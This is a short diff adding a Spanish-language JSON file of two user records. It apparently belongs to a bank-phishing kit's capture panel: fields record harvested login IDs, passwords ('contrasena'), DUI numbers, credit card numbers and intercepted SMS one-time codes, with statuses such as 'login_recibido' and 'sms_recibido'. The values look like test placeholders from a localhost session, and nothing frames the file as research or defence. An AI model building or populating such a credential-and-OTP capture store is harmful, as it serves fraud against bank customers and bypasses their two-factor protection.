@@ -1,0 +1,31 @@
+[
+    {
+        "id": "usr_d51e75df256d",
+        "fecha": "02\/09\/2026 10:25:10 PM",
+        "ip": "::1",
+        "last_seen": 1788409558,
+        "status": "sms_recibido",
+        "documento": "242442424",
+        "contrasena": "35353353",
+        "doc_type": "DUI",
+        "doc_number": "235235325235",
+        "product_type": "Tarjeta de Crédito",
+        "product_number": "25235235",
+        "sms": "555555",
+        "sms_attempts": 2
+    },
+    {
+        "id": "usr_00148ab41957",
+        "fecha": "22\/10\/2026 12:28:35 PM",
+        "ip": "::1",
+        "last_seen": 1792693718,
+        "status": "login_recibido",
+        "documento": "24242424",
+        "contrasena": "242424",
+        "doc_type": "DUI",
+        "doc_number": "",
+        "product_type": "Tarjeta de Crédito",
+        "product_number": "",
+        "sms": ""
+    }
+]
